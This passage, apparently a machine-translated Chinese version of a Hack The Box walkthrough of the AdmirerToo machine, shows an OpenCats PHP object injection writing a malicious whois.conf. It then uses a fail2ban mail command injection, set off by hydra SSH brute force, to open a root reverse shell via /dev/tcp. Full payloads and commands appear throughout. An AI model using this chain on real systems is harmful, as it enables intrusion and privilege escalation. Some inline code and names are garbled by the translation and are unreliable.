解决这个盒子最有趣的是，它作为用户和组开发运行。

#### 失败2ban

[失败2ban](https://www.fail2ban.org/wiki/index.php/Main_Page)是一个反暴力破解框架，在Linux上很常见。它安装在这里：

    jennifer@admirertoo:/etc/fail2ban$ fail2ban-client -V
    Fail2Ban v0.10.2
    
    Copyright (c) 2004-2008 Cyril Jaquier, 2008- Fail2Ban Contributors
    Copyright of modifications held by their respective authors.
    Licensed under the GNU General Public License v2 (GPL).
    

在HTB机器上，暴力破解可能导致稳定性问题的情况并不少见，但我没有在这个盒子上遇到类似的事情。 正在作为仰慕者Too上的服务运行：`fail2ban``fail2ban`

    jennifer@admirertoo:/etc/fail2ban$ systemctl list-units | grep fail
    fail2ban.service                                                                                 loaded active running   Fail2Ban Service
    

我还要指出，配置包括带有邮件操作的禁令：`/etc/fail2ban/jail.local`

    [DEFAULT]
    ignoreip = 127.0.0.1
    bantime = 60s
    destemail = root@admirertoo.htb
    sender = fail2ban@admirertoo.htb
    sendername = Fail2ban
    mta = mail
    action = %(action_mwl)s
    

因此，我应该能够通过暴力破解SSH来触发禁令。`fail2ban`

### 利用

#### 猫文件上传

CVE-2021-25294 是一个 PHP 对象注入漏洞，可导致文件写入。[这篇文章](https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html)很好地描述了它。

基本上，我可以使用我想写的文件创建一个PHP序列化对象，并将其提交给OpenCats，它将编写它。`phpggc`

这里的挑战是我能写出什么来帮助我。我在上面指出，OpenCats 是作为开发者用户/组运行的。这只剩下两个文件夹和一个文件，它们归该组所有：

    jennifer@admirertoo:~$ find / -user devel -ls 2>/dev/null
    jennifer@admirertoo:~$ find / -group devel -ls 2>/dev/null
        18630      4 -rw-r--r--   1 root     devel         104 Jul 21 11:51 /opt/opencats/INSTALL_BLOCK
       130578      4 drwxrwxr-x   2 root     devel        4096 Jul  7 06:36 /usr/local/src
       130579      4 drwxrwxr-x   2 root     devel        4096 Jul  7 06:36 /usr/local/etc
    

Web目录只能通过root编写，因此编写Web外壳将不起作用（也不会真正帮助我）。现在看到它并不容易，但一会儿会很有用。`/usr/local/etc`

#### fail2ban RCE

[此 GitHub 问题](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm)概述了将成为 CVE-2021-32749 的内容。问题在于如何将输出通过管道传送到命令。在这种情况下，默认的禁止操作是发送基于以下内容的电子邮件：`fail2ban``mail`

>     actionban = printf %%b "Hi,\n
>                 The IP <ip> has just been banned by Fail2Ban after
>                 <failures> attempts against <name>.\n\n
>                 Here is more information about <ip> :\n
>                 `%(_whois_command)s`\n
>                 Regards,\n
>                 Fail2Ban"|mail -s "[Fail2Ban] <name>: banned <ip> from <fq-hostname>" <dest>
>     

如果攻击者可以控制命令的结果，那么他们可以插入到 的文本中，这将执行。`whois``~! [command]``mail``[command]`

### 断续器

#### 策略

我可以通过暴力破解SSH来触发发送电子邮件。要利用此漏洞，我需要能够控制阿佩斯特Too从我的IP上查找中获得的响应。这意味着我需要配置以联系我的服务器。`fail2ban``fail2ban``whois``whois`

开发人员用户具有对 的写入权限。而 OpenCats 正在以开发人员的身份运行，存在一个文件写入漏洞。因此，我将尝试将一个文件写入其中，该文件将告诉 AdmirerToo 联系我的主机进行 whois 查找，我可以在其中返回已执行的有效负载。`/usr/local/etc``whois.conf``/usr/local/etc`

#### 写入配置文件

[该文件](https://manpages.debian.org/jessie/whois/whois.conf.5.en.html)每行有两个字段：`whois.conf`

*   要匹配在相关对象上的模式
*   要使用的服务器

在现实世界中，这可能看起来像[这样的例子](https://www.unpm.org/wiki/Sample_whois.conf)：

    ##
    # WHOIS servers for new TLDs (http://www.iana.org/domains/root/db)
    # Current as of 2021-01-30 13:59 UTC
    ##
    
    \.aarp$ whois.nic.aarp
    \.abarth$ whois.afilias-srs.net
    \.abbott$ whois.afilias-srs.net
    \.abbvie$ whois.afilias-srs.net
    \.abc$ whois.nic.abc
    \.abogado$ whois.nic.abogado
    \.abudhabi$ whois.nic.abudhabi
    \.academy$ whois.nic.academy
    \.accountant$ whois.nic.accountant
    \.accountants$ whois.nic.accountants
    \.ac$ whois.nic.ac
    \.aco$ whois.nic.aco
    ...[snip]...
    

`fail2ban`将查找我的IP，我希望它询问我的IP，所以我想写一些类似的东西：

    10.10.14.6 10.10.14.6
    

在 [OpenCats 漏洞利用报告之后](https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html)，我将创建该文件。我将 [phpggc](https://github.com/ambionics/phpggc) 克隆到我的机器（并更新我的路径以包括运行它），并像在文章中一样运行它：

    oxdf@hacky$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf 
    a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A22%3A%2210.10.14.6+10.10.14.6%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
    

这将把当地的内容写进仰慕者Too。`whois.conf``/usr/local/etc/whois.conf`

在我以詹妮弗身份登录的Firefox中，我将访问此网址：

    http://localhost:8081/index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A22%3A%2210.10.14.6+10.10.14.6%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
    

好消息是，该文件已写入：

    jennifer@admirertoo:~$ ls -l /usr/local/etc/
    total 4
    -rw-r--r-- 1 devel devel 254 Dec 15 19:51 whois.conf
    

坏消息是它与我需要的格式不匹配：

    jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf 
    [{"Expires":1,"Discard":false,"Value":"10.10.14.6 10.10.14.6\n"}]
    

#### 编写更好的配置文件

因为第一个字段是一个模式（正则表达式），我很幸运，写的第一个字符是.如果我能关闭它，里面的东西将被视为一组字符。如果我可以在右后放置一个，那么它将匹配0个或多个这些字符。所以我的目标是：`[``*`

    [stuff]*10.10.14.6
    

这将在我的IP上匹配，只是来自的0个字符。`*``[stuff]`

我也会有一些我想摆脱的东西。我会试着把它注释掉。所以我的意志是（我不认为我需要关闭之前的，但它不会伤害）：`whois.conf``"``]`

    "]*10.10.14.6 10.10.14.6 #
    

生成应用程序对象：

    oxdf@hacky$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf 
    a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A28%3A%22%22%5D%2A10.10.14.6+10.10.14.6+%23%0A%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
    

通过火狐提交它，该文件存在：

    jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf 
    [{"Expires":1,"Discard":false,"Value":"\"]*10.10.14.6 10.10.14.6 #\n\n"}]
    

不幸的是，如果我尝试运行 ，它会失败：`whois 10.10.14.6`

    jennifer@admirertoo:~$ whois 10.10.14.6
    Cannot parse this line: #\n\n"}]
    

#### 谁是来源

我将转到源代码来查看它如何解析配置文件（[此处](https://github.com/rfc1036/whois/blob/934a9221a769b6f5fc8aeb216461ff77e506ce75/whois.c#L419-L453)）。从第 415 行开始，它将创建一个 512 字节的缓冲区，并打开该文件：`whois``buf`

    #ifdef CONFIG_FILE
    const char *match_config_file(const char *s)
    {
        FILE *fp;
        char buf[512];
        static const char delim[] = " \t";
    
        if ((fp = fopen(CONFIG_FILE, "r")) == NULL) {
    	if (errno != ENOENT)
    	    err_sys("Cannot open " CONFIG_FILE);
    	return NULL;
        }
    

然后，它一次读取 512 个字节到：`buf`

        while (fgets(buf, sizeof(buf), fp) != NULL) {
    	    char *p;
    	    const char *pattern, *server;
    #ifdef HAVE_REGEXEC
        	int i;
    		regex_t re;
    #endif
    

然后，它找到（换行符）并将其替换为 null，终止字符串：`\r\n`

        if ((p = strpbrk(buf, "\r\n")))
                    *p = '\0';
    

在检查注释行和空行之后，它用于获取前三个项目，在空间或选项卡上拆分：`strtok`

    	pattern = strtok(p, delim);
    	server = strtok(NULL, delim);
    	if (!pattern || !server)
    	    err_quit(_("Cannot parse this line: %s"), p);
    	p = strtok(NULL, delim);
    	if (p)
    	    err_quit(_("Cannot parse this line: %s"), p);
    

第一个是，第二个是，如果第三个存在，它就失败了。这就解释了为什么我不能在模式和服务器之后发表评论。`pattern``server`

这意味着我可以在我的两个项目后面放一堆空格，如果它超过512，那么接下来的内容将不会被解析。

#### 写入工作配置文件

根据上面的分析，我将向 PHP 对象的末尾添加大量空格。在最后发送一堆空格会将多余的垃圾推离范围：

    oxdf@hacky$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf 
    a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A661%3A%22%22%5D%2A10.10.14.6+10.10.14.6+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%23%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
    

较长的文件使它成为仰慕者：

    jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf 
    [{"Expires":1,"Discard":false,"Value":"\"]*10.10.14.6 10.10.14.6                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           #\n"}]
    

现在当我跑步时，它只是挂起，并且在我的收听中有一个连接：`whois 10.10.14.6``nc`

    oxdf@hacky$ nc -lnvp 43
    Listening on 0.0.0.0 43
    Connection received on 10.10.11.137 40334
    10.10.14.6
    

#### 触发器失败2ban

使用 .接下来，我将使用 SSH 触发它。 将用 蛮力工作。运行一会儿后，我的SSH会话挂起，并且有一个连接，就像上面一样。`whois``hydra``hydra -I -l jennifer -P /usr/share/wordlists/rockyou.txt 10.10.11.137 ssh``nc`

#### 壳

我将把以下有效载荷放入 （ 不起作用...我将在端口 43 上的“超越根”中进行探索：`ncat``nc``whois`

    oxdf@hacky$ echo -e "0xdf\n~! bash -c 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1'\n" | ncat -lnvp 43
    Listening on 0.0.0.0 43
    

我还将在443上启动一个听众来捕捉外壳。我将启动 ，并刷新火狐几次。一旦我被禁止，第一个连接，然后在第二个连接：`hydra``nc`

    oxdf@hacky$ nc -lnvp 443
    Listening on 0.0.0.0 443
    Connection received on 10.10.11.137 35248
    bash: cannot set terminal process group (4794): Inappropriate ioctl for device
    bash: no job control in this shell
    root@admirertoo:/# 
    

我可以升级外壳并阅读：`root.txt`

    root@admirertoo:/# cat /root/root.txt
    ec61f63f************************
    

## 超越根

我需要使用而不是使root漏洞利用工作，这很奇怪。为什么这很重要？以下是我如何弄清楚发生了什么的摘要。`ncat``nc`

### 钢丝鲨鱼

首先，我将启动Wireshark并观察交换，看看有什么不同。看看这两个TCP流，没有什么不同。我将它移动到十六进制转储模式，并查看 VM 发送回去的数据。为：`ncat`

        00000000  70 77 6e 65 64 0a 7e 21  20 62 61 73 68 20 2d 63   pwned.~!  bash -c
        00000010  20 27 62 61 73 68 20 2d  69 20 26 3e 2f 64 65 76    'bash - i &>/dev
        00000020  2f 74 63 70 2f 31 30 2e  31 30 2e 31 34 2e 36 2f   /tcp/10. 10.14.6/
        00000030  34 34 33 20 30 3e 26 31  27 0a 0a                  443 0>&1 '..
    

和 ：`nc`

        00000000  70 77 6e 65 64 0a 7e 21  20 62 61 73 68 20 2d 63   pwned.~!  bash -c
        00000010  20 27 62 61 73 68 20 2d  69 20 26 3e 2f 64 65 76    'bash - i &>/dev
        00000020  2f 74 63 70 2f 31 30 2e  31 30 2e 31 34 2e 36 2f   /tcp/10. 10.14.6/
        00000030  34 34 33 20 30 3e 26 31  27 0a 0a                  443 0>&1 '..
    

这两者是完全相同的。因此，这不是将哪些内容发送回查询的问题。`whois`

### 离开悬而未决

查看 的 PCAP，它看起来像这样：`ncat`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220526135427554.png) 

整个交换在不到0.2秒的时间内进行。对于一个，我刚刚在失败后运行，它大致相同，但时间不同：`nc`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220526135451765.png) 

似乎由于某种原因在发送其余答案之前会卡住等待。只有在整整一分钟过去后，仰慕者才会发送一个，然后提示发送其余的答案。`nc``[FIN, ACK]``nc`

### 变通办法

我偶然发现了一些解决方法，事后看来，这是非常有道理的。我遇到过很多情况，我试图从远程主机获取文件，然后将其管道传输到 ，然后在主机上接收它，然后它就挂起了。几秒钟后，我将按住 Ctrl-c 键终止连接（并始终检查哈希值是否匹配）。`nc`

同样的想法在这里也行得通。如果我等到连接进入，然后在我的本地按Ctrl-c，漏洞利用就可以了：`nc`

    oxdf@hacky$ echo -e "0xdf\n~! bash -c 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1'\n" | nc -lnvp 43
    Listening on 0.0.0.0 43
    Connection received on 10.10.11.137 58468
    10.10.14.6
    ^C
    

在：`nc`

    oxdf@hacky$ nc -lnvp 443
    Listening on 0.0.0.0 443
    Connection received on 10.10.11.137 57392
    bash: cannot set terminal process group (3231): Inappropriate ioctl for device
    bash: no job control in this shell
    root@admirertoo:/#
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2022/05/28/htb-admirertoo.html)